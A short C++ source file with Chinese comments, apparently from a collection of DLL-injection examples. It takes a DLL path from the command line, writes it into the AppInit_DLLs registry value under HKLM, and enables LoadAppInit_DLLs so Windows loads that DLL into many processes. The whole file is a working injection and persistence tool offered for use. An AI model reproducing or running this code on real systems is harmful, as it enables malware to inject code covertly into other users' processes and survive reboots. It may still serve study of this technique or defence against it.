// DllInjectionWithRegistry.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include "../Common/Helper.h"

void OnInject(string strDllPath);

int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("Usage: InjectDll  <dll Path>\n");
		return 0;
	}

	OnInject(argv[1]);

	return 0;
}

void OnInject(string strDllPath)
{
	BOOL bRet = FALSE;
	HKEY hKey = NULL;
	LONG nReg;
	char szDllPath[MAX_PATH] = { 0 };

	//打开HKEY_LOCAL_MACHINE/Software/Microsoft/WindowsNT/CurrentVersion/Windows
	nReg = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		0,
		KEY_ALL_ACCESS,
		&hKey);

	if (nReg != ERROR_SUCCESS)
	{
		MessageBox("打开注册表失败");
		RegCloseKey(hKey);
		return;
	}

	//设置AppInit_DLLs的键值为我们的Dll
	nReg = RegSetValueEx(hKey,
		L"AppInit_DLLs",
		0,
		REG_SZ,
		(byte *)str2wstr(strDllPath).c_str(),
		(str2wstr(strDllPath).length() + 1) * sizeof(WCHAR)
	);
	if (nReg != ERROR_SUCCESS)
	{
		MessageBox("设置注册表失败！");
		RegCloseKey(hKey);
		return;
	}

	DWORD value = 1;
	nReg = RegSetValueEx(hKey,
		L"LoadAppInit_DLLs",
		0,
		REG_DWORD,
		(byte*)&value,
		sizeof(DWORD)
	);
	if (nReg != ERROR_SUCCESS)
	{
		MessageBox("设置注册表失败！");
		RegCloseKey(hKey);
		return;
	}

	RegCloseKey(hKey);
	return;
}